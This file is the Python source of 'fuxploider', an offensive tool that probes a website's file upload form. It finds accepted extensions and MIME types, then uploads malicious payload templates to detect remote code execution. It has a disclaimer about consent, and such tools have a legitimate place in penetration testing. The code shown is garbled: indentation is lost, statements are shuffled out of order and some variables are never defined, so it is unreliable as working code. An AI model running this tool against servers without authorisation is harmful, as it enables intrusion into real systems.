import re, requests, argparse, logging, os, coloredlogs, datetime, getpass, tempfile, itertools, json, concurrent.futures, random
from utils import *
from UploadForm import UploadForm
from threading import Lock
version = '0.5.0'
logging.basicConfig(datefmt='[%m/%d/%Y-%H:%M:%S]')
logger = logging.getLogger('fuxploider')
coloredlogs.install(logger=logger, fmt=
    '%(asctime)s %(levelname)s - %(message)s', level=logging.INFO)
logging.getLogger('requests').setLevel(logging.ERROR)
templatesFolder = 'payloads'
templates = json.loads(fd.read())
templatesNames = [x['templateName'] for x in templates]
templatesSection = """[TEMPLATES]
Templates are malicious payloads meant to be uploaded on the scanned remote server. Code execution detection is done based on the expected output of the payload."""
templatesSection += """
	Default templates are the following (name - description) : """
for t in templates:
templatesSection += "\n\t  * '" + t['templateName'] + "' - " + t['description']
parser = argparse.ArgumentParser(epilog=templatesSection, description=
    __doc__, formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-d', '--data', metavar='postData', dest='data', help=
    'Additionnal data to be transmitted via POST method. Example : -d "key1=value1&key2=value2"'
    , type=valid_postData)
parser.add_argument('--proxy', metavar='proxyUrl', dest='proxy', help=
    'Proxy information. Example : --proxy "user:password@proxy.host:8080"',
    type=valid_proxyString)
parser.add_argument('--proxy-creds', metavar='credentials', nargs='?',
    const=True, dest='proxyCreds', help=
    "Prompt for proxy credentials at runtime. Format : 'user:pass'", type=
    valid_proxyCreds)
parser.add_argument('-f', '--filesize', metavar='integer', nargs=1, default
    =['10'], dest='size', help=
    'File size to use for files to be created and uploaded (in kB).')
parser.add_argument('--cookies', metavar='omnomnom', nargs=1, dest=
    'cookies', help=
    'Cookies to use with HTTP requests. Example : PHPSESSID=aef45aef45afeaef45aef45&JSESSID=AQSEJHQSQSG'
    , type=valid_postData)
parser.add_argument('--uploads-path', default=[None], metavar='path', nargs
    =1, dest='uploadsPath', help=
    "Path on the remote server where uploads are put. Example : '/tmp/uploads/'"
    )
parser.add_argument('-t', '--template', metavar='templateName', nargs=1,
    dest='template', help=
    'Malicious payload to use for code execution detection. Default is to use every known templates. For a complete list of templates, see the TEMPLATE section.'
    )
parser.add_argument('-r', '--regex-override', metavar='regex', nargs=1,
    dest='regexOverride', help=
    'Specify a regular expression to detect code execution. Overrides the default code execution detection regex defined in the template in use.'
    , type=valid_regex)
requiredNamedArgs = parser.add_argument_group('Required named arguments')
requiredNamedArgs.add_argument('-u', '--url', metavar='target', dest='url',
    required=True, help=
    'Web page URL containing the file upload form to be tested. Example : http://test.com/index.html?action=upload'
    , type=valid_url)
requiredNamedArgs.add_argument('--not-regex', metavar='regex', help=
    'Regex matching an upload failure', type=valid_regex, dest='notRegex')
requiredNamedArgs.add_argument('--true-regex', metavar='regex', help=
    'Regex matching an upload success', type=valid_regex, dest='trueRegex')
exclusiveArgs = parser.add_mutually_exclusive_group()
exclusiveArgs.add_argument('-l', '--legit-extensions', metavar=
    'listOfExtensions', dest='legitExtensions', nargs=1, help=
    "Legit extensions expected, for a normal use of the form, comma separated. Example : 'jpg,png,bmp'"
    )
exclusiveArgs.add_argument('-n', metavar='n', nargs=1, default=['100'],
    dest='n', help='Number of common extensions to use. Example : -n 100',
    type=valid_nArg)
exclusiveVerbosityArgs = parser.add_mutually_exclusive_group()
exclusiveVerbosityArgs.add_argument('-v', action='store_true', required=
    False, dest='verbose', help='Verbose mode')
exclusiveVerbosityArgs.add_argument('-vv', action='store_true', required=
    False, dest='veryVerbose', help='Very verbose mode')
exclusiveVerbosityArgs.add_argument('-vvv', action='store_true', required=
    False, dest='veryVeryVerbose', help='Much verbose, very log, wow.')
parser.add_argument('-s', '--skip-recon', action='store_true', required=
    False, dest='skipRecon', help=
    'Skip recon phase, where fuxploider tries to determine what extensions are expected and filtered by the server. Needs -l switch.'
    )
parser.add_argument('-y', action='store_true', required=False, dest=
    'detectAllEntryPoints', help=
    'Force detection of every entry points. Will not stop at first code exec found.'
    )
parser.add_argument('-T', '--threads', metavar='Threads', nargs=1, dest=
    'nbThreads', help='Number of parallel tasks (threads).', type=int,
    default=[4])
exclusiveUserAgentsArgs = parser.add_mutually_exclusive_group()
exclusiveUserAgentsArgs.add_argument('-U', '--user-agent', metavar=
    'useragent', nargs=1, dest='userAgent', help=
    'User-agent to use while requesting the target.', type=str, default=[
    requests.utils.default_user_agent()])
exclusiveUserAgentsArgs.add_argument('--random-user-agent', action=
    'store_true', required=False, dest='randomUserAgent', help=
    'Use a random user-agent while requesting the target.')
manualFormArgs = parser.add_argument_group('Manual Form Detection arguments')
manualFormArgs.add_argument('-m', '--manual-form-detection', action=
    'store_true', dest='manualFormDetection', help=
    'Disable automatic form detection. Useful when automatic detection fails due to: (1) Form loaded using Javascript (2) Multiple file upload forms in URL.'
    )
manualFormArgs.add_argument('--input-name', metavar='image', dest=
    'inputName', help=
    'Name of input for file. Example: <input type="file" name="image">')
manualFormArgs.add_argument('--form-action', default='', metavar=
    'upload.php', dest='formAction', help=
    'Path of form action. Example: <form method="POST" action="upload.php">')
args = parser.parse_args()
args.uploadsPath = args.uploadsPath[0]
args.nbThreads = args.nbThreads[0]
args.userAgent = args.userAgent[0]
if args.randomUserAgent:
nb = 0
if args.template:
for l in fd:
args.template = args.template[0]
if args.regexOverride:
nb += 1
fd.seek(0)
if args.template not in templatesNames:
for t in templates:
args.verbosity = 0
nb = random.randint(0, nb)
logging.warning('Unknown template : %s', args.template)
templates = [[x for x in templates if x['templateName'] == args.template][0]]
t['codeExecRegex'] = args.regexOverride[0]
if args.verbose:
for i in range(0, nb):
cont = input('Use default templates instead ? [Y/n]')
args.verbosity = 1
if args.veryVerbose:
args.userAgent = fd.readline()[:-1]
if not cont.lower().startswith('y'):
args.verbosity = 2
if args.veryVeryVerbose:
exit()
args.verbosity = 3
logger.verbosity = args.verbosity
if args.verbosity > 0:
coloredlogs.install(logger=logger, fmt=
    '%(asctime)s %(levelname)s - %(message)s', level=logging.DEBUG)
if args.proxyCreds and args.proxy == None:
parser.error('--proxy-creds must be used with --proxy.')
if args.skipRecon and args.legitExtensions == None:
parser.error(
    '-s switch needs -l switch. Cannot skip recon phase without any known entry point.'
    )
args.n = int(args.n[0])
args.size = int(args.size[0])
args.size = 1024 * args.size
if not args.notRegex and not args.trueRegex:
parser.error(
    'At least one detection method must be provided, either with --not-regex or with --true-regex.'
    )
if args.legitExtensions:
args.legitExtensions = args.legitExtensions[0].split(',')
if args.cookies:
args.cookies = postDataFromStringToJSON(args.cookies[0])
if args.manualFormDetection and args.inputName is None:
parser.error('--manual-form-detection requires --input-name')
print(
    """[1;32m
                                     
 ___             _     _   _         
|  _|_ _ _ _ ___| |___|_|_| |___ ___ 
|  _| | |_'_| . | | . | | . | -_|  _|
|_| |___|_,_|  _|_|___|_|___|___|_|  
            |_|                      

[1m[42m{version """
     + version +
    """}[m

[m[!] legal disclaimer : Usage of fuxploider for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
	"""
    )
if args.proxyCreds == True:
args.proxyCreds = {}
now = datetime.datetime.now()
args.proxyCreds['username'] = input('Proxy username : ')
print('[*] starting at ' + str(now.hour) + ':' + str(now.minute) + ':' +
    str(now.second))
args.proxyCreds['password'] = getpass.getpass('Proxy password : ')
mimeFile = 'mimeTypes.basic'
extensions = loadExtensions('file', mimeFile)
tmpLegitExt = []
if args.legitExtensions:
args.legitExtensions = [x.lower() for x in args.legitExtensions]
args.legitExtensions = tmpLegitExt
foundExt = [a[0] for a in extensions]
postData = postDataFromStringToJSON(args.data)
for b in args.legitExtensions:
s = requests.Session()
if b in foundExt:
if args.cookies:
tmpLegitExt.append(b)
logging.warning(
    "Extension %s can't be found as a valid/known extension with associated mime type."
    , b)
for key in args.cookies.keys():
s.headers = {'User-Agent': args.userAgent}
s.cookies[key] = args.cookies[key]
s.trust_env = False
if args.proxy:
if args.proxy['username'] and args.proxy['password'] and args.proxyCreds:
if args.manualFormDetection:
logging.warning(
    'Proxy username and password provided by the --proxy-creds switch replaces credentials provided using the --proxy switch'
    )
if args.proxyCreds:
if args.formAction == '':
up = UploadForm(args.notRegex, args.trueRegex, s, args.size, postData, args
    .uploadsPath)
proxyUser = args.proxyCreds['username']
proxyUser = args.proxy['username']
logger.warning(
    'Using Manual Form Detection and no action specified with --form-action. Defaulting to empty string - meaning form action will be set to --url parameter.'
    )
up = UploadForm(args.notRegex, args.trueRegex, s, args.size, postData, args
    .uploadsPath, args.url, args.formAction, args.inputName)
up.setup(args.url)
proxyPass = args.proxyCreds['password']
proxyPass = args.proxy['password']
up.threads = args.nbThreads
proxyProtocol = args.proxy['protocol']
uploadURL = up.uploadUrl
proxyHostname = args.proxy['hostname']
fileInput = {'name': up.inputName}
proxyPort = args.proxy['port']
a = datetime.datetime.now()
proxy = ''
if not args.skipRecon:
if proxyProtocol != None:
if len(args.legitExtensions) > 0:
logger.info(
    '### Skipping detection of valid extensions, using provided extensions instead (%s)'
    , args.legitExtensions)
proxy += proxyProtocol + '://'
proxy += 'http://'
n = up.detectValidExtensions(extensions, args.n, args.legitExtensions)
n = up.detectValidExtensions(extensions, args.n)
up.validExtensions = args.legitExtensions
if proxyUser != None and proxyPass != None:
logger.info('### Tried %s extensions, %s are valid.', n, len(up.
    validExtensions))
if up.validExtensions == []:
proxy += proxyUser + ':' + proxyPass + '@'
proxy += proxyHostname
logger.error('No valid extension found.')
b = datetime.datetime.now()
if proxyPort != None:
exit()
print('Extensions detection : ' + str(b - a))
proxy += ':' + proxyPort
if proxyProtocol == 'https':
cont = input('Start uploading payloads ? [Y/n] : ')
proxies = {'https': proxy}
proxies = {'http': proxy, 'https': proxy}
up.shouldLog = True
s.proxies.update(proxies)
if cont.lower().startswith('y') or cont == '':
exit('Exiting.')
entryPoints = []
up.stopThreads = True
techniques = json.loads(rawTechniques.read())
logger.info(
    '### Starting code execution detection (messing with file extensions and mime types...)'
    )
c = datetime.datetime.now()
nbOfEntryPointsFound = 0
attempts = []
templatesData = {}
for template in templates:
templatefd = open(templatesFolder + '/' + template['filename'], 'rb')
stopThreads = False
templatesData[template['templateName']] = templatefd.read()
attemptsTested = 0
templatefd.close()
futures = []
nastyExt = template['nastyExt']
for a in attempts:
stopThreads = True
d = datetime.datetime.now()
nastyMime = getMime(extensions, nastyExt)
suffix = a['suffix']
for future in concurrent.futures.as_completed(futures):
executor.shutdown(wait=False)
print()
nastyExtVariants = template['extVariants']
mime = a['mime']
res = future.result()
executor._threads.clear()
logging.info('%s entry point(s) found using %s HTTP requests.',
    nbOfEntryPointsFound, up.httpRequests)
for t in techniques:
payload = templatesData[a['templateName']]
attemptsTested += 1
concurrent.futures.thread._threads_queues.clear()
print('Found the following entry points : ')
for nastyVariant in ([nastyExt] + nastyExtVariants):
codeExecRegex = [t['codeExecRegex'] for t in templates if t['templateName'] ==
    a['templateName']][0]
if not stopThreads:
logger.setLevel(logging.CRITICAL)
print(entryPoints)
for legitExt in up.validExtensions:
f = executor.submit(up.submitTestCase, suffix, mime, payload, codeExecRegex)
if res['codeExec']:
logger.verbosity = -1
legitMime = getMime(extensions, legitExt)
f.a = a
foundEntryPoint = future.a
mime = legitMime if t['mime'] == 'legit' else nastyMime
futures.append(f)
logging.info("\x1b[1m\x1b[42mCode execution obtained ('%s','%s','%s')\x1b[m",
    foundEntryPoint['suffix'], foundEntryPoint['mime'], foundEntryPoint[
    'templateName'])
suffix = t['suffix'].replace('$legitExt$', legitExt).replace('$nastyExt$',
    nastyVariant)
nbOfEntryPointsFound += 1
attempts.append({'suffix': suffix, 'mime': mime, 'templateName': template[
    'templateName']})
entryPoints.append(foundEntryPoint)
if not args.detectAllEntryPoints:
